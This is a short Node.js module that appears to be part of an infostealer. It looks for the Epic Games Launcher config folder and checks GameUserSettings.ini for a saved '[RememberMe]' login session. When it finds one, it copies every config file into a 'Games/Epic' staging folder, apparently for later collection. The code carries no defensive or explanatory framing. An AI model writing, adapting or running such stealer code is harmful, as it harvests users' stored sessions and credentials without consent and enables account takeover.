const fs = require('fs');
const path = require('path');
const { DirectoryPath } = require('../index.js');

const epicPath = path.join(process.env.LOCALAPPDATA, 'EpicGamesLauncher', 'Saved', 'Config', 'Windows');

if (fs.existsSync(epicPath)) {
  const loginFile = path.join(epicPath, 'GameUserSettings.ini');
  if (fs.existsSync(loginFile)) {
    fs.readFile(loginFile, 'utf8', (err, data) => {
      if (data.includes('[RememberMe]')) {
        const gamesDir = path.join(DirectoryPath, "Games");
        const epicDir = path.join(gamesDir, "Epic");

        if (!fs.existsSync(gamesDir)) {
          fs.mkdirSync(gamesDir, { recursive: true });
        }

        if (!fs.existsSync(epicDir)) {
          fs.mkdirSync(epicDir, { recursive: true });
        }

        fs.readdir(epicPath, (err, items) => {
          items.forEach(item => {
            const srcItem = path.join(epicPath, item);

            fs.lstat(srcItem, (err, stats) => {
              if (stats.isFile()) {
                const dstFile = path.join(epicDir, item);
                fs.copyFile(srcItem, dstFile, () => {});
              }
            });
          });
        });
      }
    });
  }
}
